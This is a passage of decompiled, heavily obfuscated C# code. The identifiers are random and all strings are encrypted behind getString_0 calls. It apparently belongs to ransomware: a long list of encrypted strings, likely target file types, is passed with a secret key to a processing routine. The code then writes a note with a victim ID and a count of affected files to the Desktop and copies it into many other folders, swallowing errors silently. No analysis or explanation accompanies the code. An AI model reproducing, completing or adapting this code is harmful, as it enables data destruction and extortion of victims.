				getString_0(107386163),
				getString_0(107386158),
				getString_0(107386181),
				getString_0(107386176),
				getString_0(107386139),
				getString_0(107386134),
				getString_0(107386153),
				getString_0(107386148),
				getString_0(107386107),
				getString_0(107386102),
				getString_0(107386125),
				getString_0(107386120),
				getString_0(107386115),
				getString_0(107386110),
				getString_0(107386073),
				getString_0(107386068),
				getString_0(107386063),
				getString_0(107386090),
				getString_0(107386085),
				getString_0(107386080),
				getString_0(107386043),
				getString_0(107386038),
				getString_0(107386033),
				getString_0(107386060),
				getString_0(107386055),
				getString_0(107386010),
				getString_0(107386005),
				getString_0(107386000),
				getString_0(107386027),
				getString_0(107385978),
				getString_0(107385973),
				getString_0(107385992),
				getString_0(107385987),
				getString_0(107386458),
				getString_0(107386453),
				getString_0(107386448),
				getString_0(107386471),
				getString_0(107386466),
				getString_0(107386429),
				getString_0(107386420),
				getString_0(107386415),
				getString_0(107386442),
				getString_0(107386437),
				getString_0(107386396),
				getString_0(107386391),
				getString_0(107386386),
				getString_0(107386413),
				getString_0(107386408),
				getString_0(107386403),
				getString_0(107386398),
				getString_0(107386361),
				getString_0(107386356),
				getString_0(107386351),
				getString_0(107386378),
				getString_0(107386373),
				getString_0(107386368),
				getString_0(107386331),
				getString_0(107386322),
				getString_0(107386341),
				getString_0(107386336),
				getString_0(107386295),
				getString_0(107386286),
				getString_0(107386313),
				getString_0(107386304),
				getString_0(107386263),
				getString_0(107386254),
				getString_0(107386277),
				getString_0(107386236),
				getString_0(107386231),
				getString_0(107386226),
				getString_0(107386253),
				getString_0(107386248),
				getString_0(107386243),
				getString_0(107386238),
				getString_0(107385689),
				getString_0(107385684),
				getString_0(107385679),
				getString_0(107385706),
				getString_0(107385701),
				getString_0(107385696),
				getString_0(107385659),
				getString_0(107385654),
				getString_0(107385649),
				getString_0(107385672),
				getString_0(107385667),
				getString_0(107385662),
				getString_0(107385625),
				getString_0(107385620),
				getString_0(107385635),
				getString_0(107385630),
				getString_0(107385593),
				getString_0(107385588),
				getString_0(107385583),
				getString_0(107385606),
				getString_0(107385601),
				getString_0(107385564),
				getString_0(107385559),
				getString_0(107385554),
				getString_0(107385581),
				getString_0(107385572),
				getString_0(107385531),
				getString_0(107385526),
				getString_0(107385545),
				getString_0(107385540),
				getString_0(107385535),
				getString_0(107385498),
				getString_0(107385493),
				getString_0(107385488),
				getString_0(107385515),
				getString_0(107385510),
				getString_0(107385505),
				getString_0(107385468),
				getString_0(107385459),
				getString_0(107385454),
				getString_0(107385481),
				getString_0(107385476),
				getString_0(107385947),
				getString_0(107385942),
				getString_0(107385937),
				getString_0(107385964),
				getString_0(107385959),
				getString_0(107385954),
				getString_0(107385917),
				getString_0(107385912),
				getString_0(107385907),
				getString_0(107385930),
				getString_0(107385925),
				getString_0(107385920),
				getString_0(107385883),
				getString_0(107385874),
				getString_0(107385901),
				getString_0(107385896),
				getString_0(107385891),
				getString_0(107385850),
				getString_0(107385845),
				getString_0(107385840),
				getString_0(107385867),
				getString_0(107385862),
				getString_0(107385857),
				getString_0(107385820),
				getString_0(107385815),
				getString_0(107385810),
				getString_0(107385837),
				getString_0(107385832),
				getString_0(107385827),
				getString_0(107385822),
				getString_0(107385785),
				getString_0(107385780),
				getString_0(107385803),
				getString_0(107385798),
				getString_0(107385793),
				getString_0(107385756),
				getString_0(107385751),
				getString_0(107385746),
				getString_0(107385773),
				getString_0(107385768),
				getString_0(107385763),
				getString_0(107385758),
				getString_0(107385721),
				getString_0(107385712),
				getString_0(107385739),
				getString_0(107385730),
				getString_0(107385173),
				getString_0(107385168),
				getString_0(107385195),
				getString_0(107385190),
				getString_0(107385185),
				getString_0(107385144),
				getString_0(107385139),
				getString_0(107385134),
				getString_0(107385161),
				getString_0(107385156),
				getString_0(107385151),
				getString_0(107385114),
				getString_0(107385129),
				getString_0(107385084),
				getString_0(107385079),
				getString_0(107385074),
				getString_0(107385101),
				getString_0(107385096),
				getString_0(107385091),
				getString_0(107385086),
				getString_0(107385049),
				getString_0(107385044),
				getString_0(107385039),
				getString_0(107385062),
				getString_0(107385057),
				getString_0(107385020),
				getString_0(107385011),
				getString_0(107385026),
				getString_0(107384981),
				getString_0(107385004),
				getString_0(107384995),
				getString_0(107384954),
				getString_0(107384945),
				getString_0(107384968),
				getString_0(107384959),
				getString_0(107385430),
				getString_0(107385453),
				getString_0(107385444),
				getString_0(107385439),
				getString_0(107385402),
				getString_0(107385397),
				getString_0(107385392),
				getString_0(107385419),
				getString_0(107385414),
				getString_0(107385409),
				getString_0(107385372),
				getString_0(107385367),
				getString_0(107385362),
				getString_0(107385389),
				getString_0(107385384),
				getString_0(107385375),
				getString_0(107385338),
				getString_0(107385333),
				getString_0(107385328),
				getString_0(107385355),
				getString_0(107385350),
				getString_0(107385345),
				getString_0(107385308),
				getString_0(107385303),
				getString_0(107385294),
				getString_0(107385321),
				getString_0(107385316),
				getString_0(107385311),
				getString_0(107385274),
				getString_0(107385269),
				getString_0(107385292),
				getString_0(107385287),
				getString_0(107385282),
				getString_0(107385241),
				getString_0(107385236),
				getString_0(107385259),
				getString_0(107385254),
				getString_0(107385249),
				getString_0(107385212),
				getString_0(107385207),
				getString_0(107385202),
				getString_0(107385221),
				getString_0(107385216),
				getString_0(107384667),
				getString_0(107384662),
				getString_0(107384657),
				getString_0(107384684),
				getString_0(107384679),
				getString_0(107384674),
				getString_0(107384637),
				getString_0(107384632),
				getString_0(107384627),
				getString_0(107384622),
				getString_0(107384649),
				getString_0(107384644),
				getString_0(107384639),
				getString_0(107384598),
				getString_0(107384593),
				getString_0(107384612),
				getString_0(107384571),
				getString_0(107384562),
				getString_0(107384589),
				getString_0(107384580),
				getString_0(107384575),
				getString_0(107384534),
				getString_0(107384529),
				getString_0(107384556),
				getString_0(107384551),
				getString_0(107384546),
				getString_0(107384505),
				getString_0(107384496),
				getString_0(107384519),
				getString_0(107384514),
				getString_0(107384473),
				getString_0(107384492),
				getString_0(107384483),
				getString_0(107384442),
				getString_0(107384461),
				getString_0(107384452),
				getString_0(107384923),
				getString_0(107384914),
				getString_0(107384941),
				getString_0(107384936),
				getString_0(107384931),
				getString_0(107384890),
				getString_0(107384881),
				getString_0(107384908),
				getString_0(107384903),
				getString_0(107384898),
				getString_0(107384861),
				getString_0(107384852),
				getString_0(107384871),
				getString_0(107384862),
				getString_0(107384817),
				getString_0(107384836),
				getString_0(107384795),
				getString_0(107384810),
				getString_0(107384801),
				getString_0(107384760),
				getString_0(107384751),
				getString_0(107384778),
				getString_0(107384773),
				getString_0(107384768),
				getString_0(107384727),
				getString_0(107384722),
				getString_0(107384749),
				getString_0(107384744),
				getString_0(107384739),
				getString_0(107384734),
				getString_0(107384693),
				getString_0(107384688),
				getString_0(107384715),
				getString_0(107384706),
				getString_0(107384157),
				getString_0(107384152),
				getString_0(107384143),
				getString_0(107384166),
				getString_0(107384161),
				getString_0(107384124),
				getString_0(107384115),
				getString_0(107384134),
				getString_0(107384129),
				getString_0(107384092),
				getString_0(107384083),
				getString_0(107384106),
				getString_0(107384101),
				getString_0(107384096),
				getString_0(107384059),
				getString_0(107384054),
				getString_0(107384049),
				getString_0(107384076),
				getString_0(107384071),
				getString_0(107384066),
				getString_0(107384025),
				getString_0(107384020),
				getString_0(107384015),
				getString_0(107384042),
				getString_0(107384033),
				getString_0(107383988),
				getString_0(107384007),
				getString_0(107383998),
				getString_0(107383961),
				getString_0(107383956),
				getString_0(107383951),
				getString_0(107383978),
				getString_0(107383973),
				getString_0(107383968),
				getString_0(107383931),
				getString_0(107383926),
				getString_0(107383921),
				getString_0(107383948),
				getString_0(107383943),
				getString_0(107383934),
				getString_0(107384409),
				getString_0(107384404),
				getString_0(107384399),
				getString_0(107384426),
				getString_0(107384421),
				getString_0(107384416),
				getString_0(107384379),
				getString_0(107384374),
				getString_0(107384369),
				getString_0(107384396),
				getString_0(107384391),
				getString_0(107384386),
				getString_0(107384349),
				getString_0(107384344),
				getString_0(107384339),
				getString_0(107384334),
				getString_0(107384361),
				getString_0(107384352),
				getString_0(107384311),
				getString_0(107384306),
				getString_0(107384333),
				getString_0(107384328),
				getString_0(107384323),
				getString_0(107384318),
				getString_0(107384277),
				getString_0(107384272),
				getString_0(107384299),
				getString_0(107384290),
				getString_0(107384253),
				getString_0(107384248),
				getString_0(107384263),
				getString_0(107384258),
				getString_0(107384221),
				getString_0(107384216),
				getString_0(107384211),
				getString_0(107384206),
				getString_0(107384233),
				getString_0(107384224),
				getString_0(107384187),
				getString_0(107384182),
				getString_0(107384177),
				getString_0(107384204),
				getString_0(107384199),
				getString_0(107384194),
				getString_0(107383645),
				getString_0(107383640),
				getString_0(107383635),
				getString_0(107383630),
				getString_0(107383657),
				getString_0(107383652),
				getString_0(107383647),
				getString_0(107383610),
				getString_0(107383605),
				getString_0(107383600),
				getString_0(107383627),
				getString_0(107383622),
				getString_0(107383617),
				getString_0(107383576),
				getString_0(107383571),
				getString_0(107383566),
				getString_0(107383593),
				getString_0(107383588),
				getString_0(107383547),
				getString_0(107383542),
				getString_0(107383537),
				getString_0(107383564),
				getString_0(107383559),
				getString_0(107383554),
				getString_0(107383517),
				getString_0(107383512),
				getString_0(107383503),
				getString_0(107383530),
				getString_0(107383525),
				getString_0(107383484),
				getString_0(107383499),
				getString_0(107383494),
				getString_0(107383489),
				getString_0(107383452),
				getString_0(107383443),
				getString_0(107383438),
				getString_0(107383457),
				getString_0(107383416),
				getString_0(107383407),
				getString_0(107383434),
				getString_0(107383429),
				getString_0(107383424),
				getString_0(107383899),
				getString_0(107383894),
				getString_0(107383889),
				getString_0(107383912),
				getString_0(107383907),
				getString_0(107383866),
				getString_0(107383861),
				getString_0(107383856),
				getString_0(107383883),
				getString_0(107383878),
				getString_0(107383873),
				getString_0(107383836),
				getString_0(107383831),
				getString_0(107383826),
				getString_0(107383853),
				getString_0(107383848),
				getString_0(107383843),
				getString_0(107383838),
				getString_0(107383801),
				getString_0(107383796),
				getString_0(107383819),
				getString_0(107383814),
				getString_0(107383809),
				getString_0(107383772),
				getString_0(107383767),
				getString_0(107383762),
				getString_0(107383789),
				getString_0(107383784),
				getString_0(107383775),
				getString_0(107383738),
				getString_0(107383729),
				getString_0(107383756),
				getString_0(107383751),
				getString_0(107383746),
				getString_0(107383705),
				getString_0(107383696),
				getString_0(107383723),
				getString_0(107383718),
				getString_0(107383677),
				getString_0(107383672),
				getString_0(107383667),
				getString_0(107383662),
				getString_0(107383689),
				getString_0(107383680),
				getString_0(107383131),
				getString_0(107383126),
				getString_0(107383149),
				getString_0(107383140),
				getString_0(107383135),
				getString_0(107383094),
				getString_0(107383089),
				getString_0(107383112),
				getString_0(107383103),
				getString_0(107383066),
				getString_0(107383061),
				getString_0(107383056),
				getString_0(107383083),
				getString_0(107383078),
				getString_0(107383073),
				getString_0(107383036),
				getString_0(107383031),
				getString_0(107383050),
				getString_0(107383045),
				getString_0(107383004),
				getString_0(107382999),
				getString_0(107382994),
				getString_0(107383017),
				getString_0(107383008),
				getString_0(107382971),
				getString_0(107382966),
				getString_0(107382961),
				getString_0(107382984),
				getString_0(107382979),
				getString_0(107382974),
				getString_0(107382933),
				getString_0(107382952),
				getString_0(107382947),
				getString_0(107382902),
				getString_0(107382897),
				getString_0(107382920),
				getString_0(107382915),
				getString_0(107382910),
				getString_0(107383385),
				getString_0(107383380),
				getString_0(107383403),
				getString_0(107383394),
				getString_0(107383353),
				getString_0(107383372),
				getString_0(107383367),
				getString_0(107383358),
				getString_0(107383321),
				getString_0(107383316),
				getString_0(107383311),
				getString_0(107383334),
				getString_0(107383329),
				getString_0(107383292),
				getString_0(107383283),
				getString_0(107383306),
				getString_0(107383301),
				getString_0(107383256),
				getString_0(107383247),
				getString_0(107383274),
				getString_0(107383269),
				getString_0(107383264),
				getString_0(107383227),
				getString_0(107383222),
				getString_0(107383217),
				getString_0(107383244),
				getString_0(107383239),
				getString_0(107383234),
				getString_0(107383197),
				getString_0(107383184),
				getString_0(107383211),
				getString_0(107383206),
				getString_0(107383201),
				getString_0(107383152),
				getString_0(107383179),
				getString_0(107383174),
				getString_0(107382621),
				getString_0(107382616),
				getString_0(107382611),
				getString_0(107382606),
				getString_0(107382633),
				getString_0(107382628),
				getString_0(107382623),
				getString_0(107382578),
				getString_0(107382601),
				getString_0(107382596),
				getString_0(107382591),
				getString_0(107382554),
				getString_0(107382549),
				getString_0(107382572),
				getString_0(107382563),
				getString_0(107382558),
				getString_0(107382521),
				getString_0(107382512),
				getString_0(107382539),
				getString_0(107382534),
				getString_0(107382529),
				getString_0(107382492),
				getString_0(107382487),
				getString_0(107382482),
				getString_0(107382509),
				getString_0(107382504),
				getString_0(107382495),
				getString_0(107382458),
				getString_0(107382453),
				getString_0(107382448),
				getString_0(107382471),
				getString_0(107382466),
				getString_0(107382425),
				getString_0(107382420),
				getString_0(107382415),
				getString_0(107382438),
				getString_0(107382433),
				getString_0(107382396),
				getString_0(107382391),
				getString_0(107382386),
				getString_0(107382409),
				getString_0(107382400),
				getString_0(107382875),
				getString_0(107382870),
				getString_0(107382865),
				getString_0(107382892),
				getString_0(107382887),
				getString_0(107382878),
				getString_0(107382837),
				getString_0(107382832),
				getString_0(107382859),
				getString_0(107382854),
				getString_0(107382849),
				getString_0(107382812),
				getString_0(107382807),
				getString_0(107382802),
				getString_0(107382829),
				getString_0(107382824),
				getString_0(107382819),
				getString_0(107382778),
				getString_0(107382773),
				getString_0(107382768),
				getString_0(107382795),
				getString_0(107382786),
				getString_0(107382749),
				getString_0(107382744),
				getString_0(107382739),
				getString_0(107382734),
				getString_0(107382761),
				getString_0(107382756),
				getString_0(107382751),
				getString_0(107382714),
				getString_0(107382709),
				getString_0(107382704),
				getString_0(107382731),
				getString_0(107382726),
				getString_0(107382721),
				getString_0(107382680),
				getString_0(107382675),
				getString_0(107382670),
				getString_0(107382697),
				getString_0(107382688),
				getString_0(107382647),
				getString_0(107382642),
				getString_0(107382665),
				getString_0(107382656),
				getString_0(107382107),
				getString_0(107382098),
				getString_0(107382117),
				getString_0(107382072),
				getString_0(107382091),
				getString_0(107382086),
				getString_0(107382081),
				getString_0(107382044),
				getString_0(107382039),
				getString_0(107382030),
				getString_0(107382057),
				getString_0(107382052),
				getString_0(107382047),
				getString_0(107382010),
				getString_0(107382005),
				getString_0(107382000),
				getString_0(107382023),
				getString_0(107382018),
				getString_0(107381981),
				getString_0(107381976),
				getString_0(107381971),
				getString_0(107381966),
				getString_0(107381993),
				getString_0(107381988),
				getString_0(107381983),
				getString_0(107381946),
				getString_0(107381941),
				getString_0(107381936),
				getString_0(107381963),
				getString_0(107381954),
				getString_0(107381913),
				getString_0(107381908),
				getString_0(107381903),
				getString_0(107381930),
				getString_0(107381921),
				getString_0(107381884),
				getString_0(107381879),
				getString_0(107381874),
				getString_0(107381901),
				getString_0(107381892),
				getString_0(107381887),
				getString_0(107382358),
				getString_0(107382353),
				getString_0(107382380),
				getString_0(107382375),
				getString_0(107382370),
				getString_0(107382333),
				getString_0(107382328),
				getString_0(107382323),
				getString_0(107382318),
				getString_0(107382341),
				getString_0(107382300),
				getString_0(107382295),
				getString_0(107382286),
				getString_0(107382313),
				getString_0(107382308),
				getString_0(107382303),
				getString_0(107382266),
				getString_0(107382261),
				getString_0(107382256),
				getString_0(107382283),
				getString_0(107382278),
				getString_0(107382237),
				getString_0(107382232),
				getString_0(107382227),
				getString_0(107382250),
				getString_0(107382245),
				getString_0(107382240),
				getString_0(107382203),
				getString_0(107382198),
				getString_0(107382193),
				getString_0(107382220),
				getString_0(107382215),
				getString_0(107382210),
				getString_0(107382173),
				getString_0(107382168),
				getString_0(107382163),
				getString_0(107382158),
				getString_0(107382185),
				getString_0(107382180),
				getString_0(107382175),
				getString_0(107382138),
				getString_0(107382153),
				getString_0(107381588),
				getString_0(107381583),
				getString_0(107381610),
				getString_0(107381605),
				getString_0(107381560),
				getString_0(107381579),
				getString_0(107381566),
				getString_0(107381529),
				getString_0(107381524),
				getString_0(107381519),
				getString_0(107381546),
				getString_0(107381537),
				getString_0(107381496),
				getString_0(107381491),
				getString_0(107381486),
				getString_0(107381513),
				getString_0(107381508),
				getString_0(107381503),
				getString_0(107381466),
				getString_0(107381457),
				getString_0(107381484),
				getString_0(107381479),
				getString_0(107381434),
				getString_0(107381429),
				getString_0(107381452),
				getString_0(107381439),
				getString_0(107381398),
				getString_0(107381413),
				getString_0(107381368),
				getString_0(107381363),
				getString_0(107381358),
				getString_0(107381385),
				getString_0(107381376),
				getString_0(107381851),
				getString_0(107381846),
				getString_0(107381841),
				getString_0(107381868),
				getString_0(107381859),
				getString_0(107381818),
				getString_0(107381813),
				getString_0(107381808),
				getString_0(107381835),
				getString_0(107381826),
				getString_0(107381789),
				getString_0(107381784),
				getString_0(107381779),
				getString_0(107381774),
				getString_0(107381801),
				getString_0(107381796),
				getString_0(107381791),
				getString_0(107381754),
				getString_0(107381749),
				getString_0(107381744),
				getString_0(107381771),
				getString_0(107381766),
				getString_0(107381761),
				getString_0(107381712),
				getString_0(107381739),
				getString_0(107381734),
				getString_0(107381729),
				getString_0(107381688),
				getString_0(107381679),
				getString_0(107381706),
				getString_0(107381697),
				getString_0(107381660),
				getString_0(107381647),
				getString_0(107381662),
				getString_0(107381625),
				getString_0(107381620),
				getString_0(107381615),
				getString_0(107381638),
				getString_0(107381633),
				getString_0(107381084),
				getString_0(107381071),
				getString_0(107381094),
				getString_0(107381089),
				getString_0(107381052),
				getString_0(107381047),
				getString_0(107381038),
				getString_0(107381065),
				getString_0(107381056),
				getString_0(107381015),
				getString_0(107381010),
				getString_0(107381037),
				getString_0(107381032),
				getString_0(107381023),
				getString_0(107380982),
				getString_0(107380977),
				getString_0(107381004),
				getString_0(107380999),
				getString_0(107380994),
				getString_0(107380957),
				getString_0(107380952),
				getString_0(107380947),
				getString_0(107380942),
				getString_0(107380965),
				getString_0(107380960),
				getString_0(107380923),
				getString_0(107380918),
				getString_0(107380913),
				getString_0(107380940),
				getString_0(107380935),
				getString_0(107380930),
				getString_0(107380893),
				getString_0(107380884),
				getString_0(107380879),
				getString_0(107380906),
				getString_0(107380901),
				getString_0(107380860),
				getString_0(107380855),
				getString_0(107380850),
				getString_0(107380869),
				getString_0(107380864),
				getString_0(107381339),
				getString_0(107381334),
				getString_0(107381329),
				getString_0(107381356),
				getString_0(107381351),
				getString_0(107381342),
				getString_0(107381305),
				getString_0(107381296),
				getString_0(107381323),
				getString_0(107381274),
				getString_0(107381269),
				getString_0(107381264),
				getString_0(107381291),
				getString_0(107381286),
				getString_0(107381281),
				getString_0(107381244),
				getString_0(107381239),
				getString_0(107381234),
				getString_0(107381261),
				getString_0(107381256),
				getString_0(107381247),
				getString_0(107381210),
				getString_0(107381205),
				getString_0(107381200),
				getString_0(107381227),
				getString_0(107381222),
				getString_0(107381217),
				getString_0(107381180),
				getString_0(107381175),
				getString_0(107381170),
				getString_0(107381197),
				getString_0(107381192),
				getString_0(107381187),
				getString_0(107381146),
				getString_0(107381137),
				getString_0(107381164),
				getString_0(107381159),
				getString_0(107381150),
				getString_0(107381113),
				getString_0(107381108),
				getString_0(107381131),
				getString_0(107381126),
				getString_0(107381121),
				getString_0(107413340),
				getString_0(107413335),
				getString_0(107413330),
				getString_0(107413357),
				getString_0(107413348),
				getString_0(107413343),
				getString_0(107413306),
				getString_0(107413301),
				getString_0(107413324),
				getString_0(107413319),
				getString_0(107413310),
				getString_0(107413269),
				getString_0(107413264),
				getString_0(107413291),
				getString_0(107413286),
				getString_0(107413245),
				getString_0(107413236),
				getString_0(107413231),
				getString_0(107413258),
				getString_0(107413253),
				getString_0(107413212),
				getString_0(107413207),
				getString_0(107413202),
				getString_0(107413225),
				getString_0(107413220),
				getString_0(107413175),
				getString_0(107413170),
				getString_0(107413197),
				getString_0(107413192),
				getString_0(107413187),
				getString_0(107413146),
				getString_0(107413141),
				getString_0(107413136),
				getString_0(107413159),
				getString_0(107413154),
				getString_0(107413117),
				getString_0(107413104),
				getString_0(107413131),
				getString_0(107413122),
				getString_0(107413597),
				getString_0(107413584),
				getString_0(107413611),
				getString_0(107413606),
				getString_0(107413601),
				getString_0(107413564),
				getString_0(107413559),
				getString_0(107413554),
				getString_0(107413581),
				getString_0(107413576),
				getString_0(107413571),
				getString_0(107413566),
				getString_0(107413529),
				getString_0(107413524),
				getString_0(107413547),
				getString_0(107413542),
				getString_0(107413501),
				getString_0(107413492),
				getString_0(107413487),
				getString_0(107413514),
				getString_0(107413505),
				getString_0(107413464),
				getString_0(107413459),
				getString_0(107413454),
				getString_0(107413477),
				getString_0(107413472),
				getString_0(107413435),
				getString_0(107413430),
				getString_0(107413425),
				getString_0(107413452),
				getString_0(107413447),
				getString_0(107413438),
				getString_0(107413401),
				getString_0(107413396),
				getString_0(107413391),
				getString_0(107413418),
				getString_0(107413413),
				getString_0(107413372),
				getString_0(107413367),
				getString_0(107413362),
				getString_0(107413389),
				getString_0(107413380),
				getString_0(107412827),
				getString_0(107412822),
				getString_0(107412817),
				getString_0(107412840),
				getString_0(107412831),
				getString_0(107412794),
				getString_0(107412785),
				getString_0(107412804),
				getString_0(107412799),
				getString_0(107412758),
				getString_0(107412753),
				getString_0(107412780),
				getString_0(107412775),
				getString_0(107412770),
				getString_0(107412733),
				getString_0(107412728),
				getString_0(107412723),
				getString_0(107412718),
				getString_0(107412745),
				getString_0(107412740),
				getString_0(107412735),
				getString_0(107412698),
				getString_0(107412693),
				getString_0(107412688),
				getString_0(107412711),
				getString_0(107412706),
				getString_0(107412669),
				getString_0(107412664),
				getString_0(107412655),
				getString_0(107412682),
				getString_0(107412673),
				getString_0(107412636),
				getString_0(107412631),
				getString_0(107412622),
				getString_0(107412645),
				getString_0(107412640),
				getString_0(107412603),
				getString_0(107412598),
				getString_0(107412593),
				getString_0(107412620),
				getString_0(107412611),
				getString_0(107413082),
				getString_0(107413101),
				getString_0(107413088),
				getString_0(107413051),
				getString_0(107413046),
				getString_0(107413069),
				getString_0(107413064),
				getString_0(107413055),
				getString_0(107413018),
				getString_0(107413013),
				getString_0(107413008),
				getString_0(107413031),
				getString_0(107413026),
				getString_0(107412985),
				getString_0(107412976),
				getString_0(107412999),
				getString_0(107412990),
				getString_0(107412953),
				getString_0(107412948),
				getString_0(107412943),
				getString_0(107412970),
				getString_0(107412961),
				getString_0(107412924),
				getString_0(107412919),
				getString_0(107412914),
				getString_0(107412941),
				getString_0(107412936),
				getString_0(107412931),
				getString_0(107412890),
				getString_0(107412885),
				getString_0(107412880),
				getString_0(107412907),
				getString_0(107412902),
				getString_0(107412897),
				getString_0(107412860),
				getString_0(107412855),
				getString_0(107412850),
				getString_0(107412877),
				getString_0(107412872),
				getString_0(107412867),
				getString_0(107412862),
				getString_0(107412309),
				getString_0(107412304),
				getString_0(107412331),
				getString_0(107412322),
				getString_0(107412285),
				getString_0(107412280),
				getString_0(107412275),
				getString_0(107412270),
				getString_0(107412297),
				getString_0(107412292),
				getString_0(107412251),
				getString_0(107412246),
				getString_0(107412241),
				getString_0(107412268),
				getString_0(107412263),
				getString_0(107412254),
				getString_0(107412217),
				getString_0(107412212),
				getString_0(107412207),
				getString_0(107412234),
				getString_0(107412229),
				getString_0(107412224),
				getString_0(107412187),
				getString_0(107412182),
				getString_0(107412205),
				getString_0(107412200),
				getString_0(107412195),
				getString_0(107412190),
				getString_0(107412149),
				getString_0(107412144),
				getString_0(107412171),
				getString_0(107412166),
				getString_0(107412161),
				getString_0(107412124),
				getString_0(107412115),
				getString_0(107412110),
				getString_0(107412137),
				getString_0(107412132),
				getString_0(107412091),
				getString_0(107412086),
				getString_0(107412081),
				getString_0(107412108),
				getString_0(107412103),
				getString_0(107412098),
				getString_0(107412573),
				getString_0(107412564),
				getString_0(107412559),
				getString_0(107412582),
				getString_0(107412541),
				getString_0(107412536),
				getString_0(107412531),
				getString_0(107412526),
				getString_0(107412553),
				getString_0(107412548),
				getString_0(107412543),
				getString_0(107412502),
				getString_0(107412497),
				getString_0(107412524),
				getString_0(107412519),
				getString_0(107412514),
				getString_0(107412473),
				getString_0(107412464),
				getString_0(107412491),
				getString_0(107412486),
				getString_0(107412481),
				getString_0(107412440),
				getString_0(107412435),
				getString_0(107412430),
				getString_0(107412453),
				getString_0(107412412),
				getString_0(107412399),
				getString_0(107412422),
				getString_0(107412381),
				getString_0(107412372),
				getString_0(107412395),
				getString_0(107412386),
				getString_0(107412349),
				getString_0(107412336),
				getString_0(107412359),
				getString_0(107412350),
				getString_0(107411801),
				getString_0(107411796),
				getString_0(107411819),
				getString_0(107411814),
				getString_0(107411773),
				getString_0(107411768),
				getString_0(107411759),
				getString_0(107411786),
				getString_0(107411781),
				getString_0(107411776),
				getString_0(107411731),
				getString_0(107411754),
				getString_0(107411749),
				getString_0(107411744),
				getString_0(107411707),
				getString_0(107411702),
				getString_0(107411725),
				getString_0(107411720),
				getString_0(107411711),
				getString_0(107411674),
				getString_0(107411669),
				getString_0(107411664),
				getString_0(107411687),
				getString_0(107411682),
				getString_0(107411645),
				getString_0(107411636),
				getString_0(107411631),
				getString_0(107411654),
				getString_0(107411613),
				getString_0(107411608),
				getString_0(107411603),
				getString_0(107411626),
				getString_0(107411617),
				getString_0(107411576),
				getString_0(107411571),
				getString_0(107411566),
				getString_0(107411593),
				getString_0(107411588),
				getString_0(107412059),
				getString_0(107412054),
				getString_0(107412049),
				getString_0(107412068),
				getString_0(107412023),
				getString_0(107412042),
				getString_0(107411997),
				getString_0(107411992),
				getString_0(107411987),
				getString_0(107411982),
				getString_0(107412009),
				getString_0(107412004),
				getString_0(107411999),
				getString_0(107411958),
				getString_0(107411953),
				getString_0(107411980),
				getString_0(107411971),
				getString_0(107411930),
				getString_0(107411925),
				getString_0(107411920),
				getString_0(107411947),
				getString_0(107411942),
				getString_0(107411937),
				getString_0(107411900),
				getString_0(107411895),
				getString_0(107411890),
				getString_0(107411913),
				getString_0(107411908),
				getString_0(107411903),
				getString_0(107411862),
				getString_0(107411857),
				getString_0(107411884),
				getString_0(107411879),
				getString_0(107411874),
				getString_0(107411837),
				getString_0(107411832),
				getString_0(107411823),
				getString_0(107411850),
				getString_0(107411845),
				getString_0(107411840)
			}, new string[0], yAXQiwwBLBX(secureString), getString_0(107411287));
		}
		catch (Exception ex9)
		{
			if (fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(TVaVFXxrZtbC, getString_0(107411298) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107411240)));
				streamWriter.WriteLine(getString_0(107396653));
				streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107407742)));
				streamWriter.WriteLine(IdBmCgBFDzJuS);
				if (wWAWZjvXYQSD == getString_0(107396257))
				{
					streamWriter.WriteLine(getString_0(107396653));
					streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107407165)) + Convert.ToString(ojqyMmFKXxQzx.Count));
				}
				if (pWNBRDgBMEak)
				{
					streamWriter.WriteLine(getString_0(107396653));
					streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107407088)));
					streamWriter.WriteLine(FZYQuTJPlcz.bHHLhQTTINyhzg());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				if (!text3.Contains(IdBmCgBFDzJuS) && !jHNjZakAkEHPd)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273), getString_0(107407055) + IdBmCgBFDzJuS);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in JGpmykxMfw)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107411273)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273), item + getString_0(107411273), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
					if (!text4.Contains(IdBmCgBFDzJuS) && !jHNjZakAkEHPd)
					{
						File.AppendAllText(item + getString_0(107411273), getString_0(107407055) + IdBmCgBFDzJuS);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!kqjAwtfZegDGvm && num > 10)
			{
				break;
			}
		}
		if (ALuUYkUNFV == getString_0(107396947))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407026)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407026));
					streamWriter2.WriteLine(IOVuiCuRiaYQ(getString_0(107406993)));
					streamWriter2.WriteLine(getString_0(107396653));
					streamWriter2.WriteLine(IOVuiCuRiaYQ(getString_0(107369013)));
					streamWriter2.WriteLine(IdBmCgBFDzJuS + IOVuiCuRiaYQ(getString_0(107368924)));
					if (wWAWZjvXYQSD == getString_0(107396257))
					{
						streamWriter2.WriteLine(getString_0(107396653));
						streamWriter2.WriteLine(IOVuiCuRiaYQ(getString_0(107368911)) + IOVuiCuRiaYQ(getString_0(107407165)) + Convert.ToString(ojqyMmFKXxQzx.Count) + IOVuiCuRiaYQ(getString_0(107368924)));
					}
